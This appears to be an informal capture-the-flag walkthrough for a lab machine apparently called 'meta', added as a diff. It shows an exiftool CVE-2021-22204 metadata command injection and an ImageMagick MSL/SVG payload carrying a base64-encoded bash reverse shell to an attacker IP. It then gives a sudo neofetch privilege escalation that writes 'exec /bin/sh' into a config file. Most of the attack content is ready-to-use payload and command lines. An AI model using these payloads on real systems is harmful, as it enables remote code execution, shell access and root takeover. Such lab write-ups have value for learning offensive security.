@@ -1,0 +1,39 @@
+the page takes image jpg as input then shows the meta data of it
+
+exiftool had a vulnerability,CVE-2021-22204
+
+(metadata "\c${system('id')};") this is embeded in image file and when we upload we get a shell
+
+we used base64 for shell
+
+now on getting shell it had a cronjob with morgify
+
+so we checked and we need to upload a svg file which it convert into png to give us a shell
+
+```
+<image authenticate='ff" `echo "YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDQgMD4mMSAK" | base64 -d | bash`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="msl:mog-shell.svg" height="100" width="100"/>
+  </svg>
+</image>
+```
+
+no fetch
+
+```
+The \"\" at the end is designed to prevent any other parameters from being added when run with sudo.
+
+env_keep+=XDG_CONFIG_HOME is set. env_keep defines environment variables that are preserved when the user changes. XDG_CONFIG_HOME is the directory where user configs are stored:
+
+$XDG_CONFIG_HOME defines the base directory relative to which user-specific configuration files should be stored. If $XDG_CONFIG_HOME is either not set or empty, a default equal to $HOME/.config should be used.
+
+
+thomas@meta:~$ echo 'exec /bin/sh' > .config/neofetch/config.conf
+XDG_CONFIG_HOME=~/.config sudo neofetch
+
+root
+```
